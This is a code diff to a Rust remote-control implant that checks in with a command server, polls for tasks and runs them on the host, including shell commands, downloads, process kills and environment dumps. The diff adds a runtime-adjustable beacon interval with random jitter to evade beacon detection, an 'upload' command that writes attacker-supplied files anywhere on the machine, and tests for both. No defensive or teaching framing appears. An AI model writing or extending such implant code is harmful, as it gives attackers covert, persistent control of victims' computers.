@@ -3,6 +3,7 @@ use reqwest::Client;
 use std::error::Error;
 use std::{
     net::UdpSocket,
+    sync::atomic::{AtomicU64, Ordering},
     time::{Duration, SystemTime},
 };
 use tokio::time::sleep;
@@ -73,6 +74,10 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
     let implant_id = data.implant_id;
     println!("Checked in. Implant ID: {}", implant_id);
 
+    // Beacon interval in seconds and jitter percent, adjustable at runtime with `sleep`.
+    let interval = AtomicU64::new(args.interval.max(1));
+    let jitter = AtomicU64::new(0);
+
     // Poll-execute-report loop
     loop {
         // Fetch tasks for this implant
@@ -84,7 +89,7 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
             Ok(resp) => resp,
             Err(e) => {
                 eprintln!("Failed to fetch tasks: {}", e);
-                sleep(Duration::from_secs(args.interval)).await;
+                sleep(Duration::from_secs(interval.load(Ordering::SeqCst))).await;
                 continue;
             }
         };
@@ -97,7 +102,7 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
         for task in tasks {
             println!("Executing command: {}", task.command);
 
-            let task_result = run_command(&task, implant_id);
+            let task_result = run_command(&task, implant_id, &interval, &jitter);
 
             // Post the result back
             if let Err(e) = client
@@ -110,8 +115,12 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
             }
         }
 
-        // Wait before the next poll
-        sleep(Duration::from_secs(args.interval)).await;
+        // Wait before the next poll, honoring the current interval and jitter.
+        let wait = jittered(
+            interval.load(Ordering::SeqCst),
+            jitter.load(Ordering::SeqCst),
+        );
+        sleep(Duration::from_secs(wait)).await;
     }
 }
 
@@ -122,7 +131,12 @@ fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn E
 }
 
 /// Dispatch a task to the native command implementation and build its result.
-pub fn run_command(task: &Task, implant_id: Uuid) -> TaskResult {
+pub fn run_command(
+    task: &Task,
+    implant_id: Uuid,
+    interval: &AtomicU64,
+    jitter: &AtomicU64,
+) -> TaskResult {
     let now = SystemTime::now();
 
     let result = match task.command.as_str() {
@@ -136,12 +150,13 @@ pub fn run_command(task: &Task, implant_id: Uuid) -> TaskResult {
         "cp" => cmd_cp(&task.args),
         "touch" => cmd_touch(&task.args),
         "download" => cmd_download(&task.args),
+        "upload" => cmd_upload(task),
         "systeminfo" => cmd_systeminfo(&task.args),
         "whoami" => cmd_whoami(&task.args),
         "env" => cmd_env(&task.args),
         "ps" => cmd_ps(&task.args),
         "kill" => cmd_kill(&task.args),
-        "sleep" => cmd_sleep(&task.args),
+        "sleep" => cmd_sleep(&task.args, interval, jitter),
         "netstat" => cmd_netstat(&task.args),
         "ipconfig" => cmd_ipconfig(&task.args),
         "shell" => cmd_shell(&task.args),
@@ -404,14 +419,77 @@ fn cmd_env(_args: &[String]) -> Result<CommandOutput, String> {
     Ok(CommandOutput::Table { headers, rows })
 }
 
-fn cmd_sleep(args: &[String]) -> Result<CommandOutput, String> {
+fn cmd_sleep(
+    args: &[String],
+    interval: &AtomicU64,
+    jitter: &AtomicU64,
+) -> Result<CommandOutput, String> {
     let seconds: u64 = args
         .first()
-        .ok_or_else(|| "usage: sleep <seconds>".to_string())?
+        .ok_or_else(|| "usage: sleep <seconds> [jitter-percent]".to_string())?
         .parse()
         .map_err(|_| "sleep: seconds must be a number".to_string())?;
-    std::thread::sleep(std::time::Duration::from_secs(seconds));
-    Ok(CommandOutput::Text(format!("slept {}s", seconds)))
+    if seconds == 0 {
+        return Err("sleep: seconds must be greater than 0".to_string());
+    }
+    let jitter_percent: u64 = match args.get(1) {
+        Some(value) => value
+            .parse()
+            .map_err(|_| "sleep: jitter must be a number".to_string())?,
+        None => 0,
+    };
+    if jitter_percent > 100 {
+        return Err("sleep: jitter must be between 0 and 100".to_string());
+    }
+
+    interval.store(seconds, Ordering::SeqCst);
+    jitter.store(jitter_percent, Ordering::SeqCst);
+    Ok(CommandOutput::Text(format!(
+        "beacon interval set to {}s (jitter {}%)",
+        seconds, jitter_percent
+    )))
+}
+
+/// Apply jitter to a beacon interval using a time-seeded xorshift.
+fn jittered(seconds: u64, jitter_percent: u64) -> u64 {
+    let seconds = seconds.max(1);
+    if jitter_percent == 0 {
+        return seconds;
+    }
+
+    let seed = SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos() as u64)
+        .unwrap_or(1);
+    let mut x = seed | 1;
+    x ^= x << 13;
+    x ^= x >> 7;
+    x ^= x << 17;
+
+    let span = seconds.saturating_mul(jitter_percent) / 100;
+    if span == 0 {
+        return seconds;
+    }
+    let offset = x % (span * 2 + 1); // 0..=2*span
+    (seconds + offset).saturating_sub(span).max(1)
+}
+
+fn cmd_upload(task: &Task) -> Result<CommandOutput, String> {
+    let data = task
+        .data
+        .as_ref()
+        .ok_or_else(|| "upload: no file data received".to_string())?;
+    let path = task
+        .args
+        .first()
+        .cloned()
+        .unwrap_or_else(|| "upload.bin".to_string());
+    std::fs::write(&path, data).map_err(|e| format!("{}: {}", path, e))?;
+    Ok(CommandOutput::Text(format!(
+        "uploaded {} bytes to {}",
+        data.len(),
+        path
+    )))
 }
 
 fn cmd_shell(args: &[String]) -> Result<CommandOutput, String> {
@@ -472,9 +550,14 @@ mod tests {
             session_id: 0,
             command: command.to_string(),
             args: args.iter().map(|s| s.to_string()).collect(),
+            data: None,
             created_at: SystemTime::now(),
             status: TaskStatus::Pending,
         }
+    }
+
+    fn run(task: &Task) -> TaskResult {
+        run_command(task, task.implant_id, &AtomicU64::new(5), &AtomicU64::new(0))
     }
 
     #[test]
@@ -517,14 +600,14 @@ mod tests {
     #[test]
     fn known_command_completes() {
         let task = task("systeminfo", &[]);
-        let result = run_command(&task, task.implant_id);
+        let result = run(&task);
         assert_eq!(result.status, TaskStatus::Completed);
     }
 
     #[test]
     fn unknown_command_fails() {
         let task = task("frobnicate", &[]);
-        let result = run_command(&task, task.implant_id);
+        let result = run(&task);
         assert_eq!(result.status, TaskStatus::Failed);
         assert!(result
             .error
@@ -610,7 +693,38 @@ mod tests {
     }
 
     #[test]
-    fn sleep_zero_succeeds() {
-        assert!(cmd_sleep(&["0".to_string()]).is_ok());
+    fn sleep_sets_the_beacon() {
+        let interval = AtomicU64::new(5);
+        let jitter = AtomicU64::new(0);
+        let task = task("sleep", &["30", "20"]);
+        let result = run_command(&task, task.implant_id, &interval, &jitter);
+        assert_eq!(result.status, TaskStatus::Completed);
+        assert_eq!(interval.load(Ordering::SeqCst), 30);
+        assert_eq!(jitter.load(Ordering::SeqCst), 20);
+    }
+
+    #[test]
+    fn jitter_stays_in_range() {
+        assert_eq!(jittered(10, 0), 10);
+        for _ in 0..50 {
+            let value = jittered(10, 50);
+            assert!((5..=15).contains(&value), "jittered out of range: {}", value);
+        }
+    }
+
+    #[test]
+    fn upload_writes_data() {
+        let dir = std::env::temp_dir().join(format!("rb_up_{}", Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("received.bin");
+
+        let mut task = task("upload", &[path.to_str().unwrap()]);
+        task.data = Some(b"payload".to_vec());
+        let result = run(&task);
+
+        assert_eq!(result.status, TaskStatus::Completed);
+        assert_eq!(std::fs::read(&path).unwrap(), b"payload");
+
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
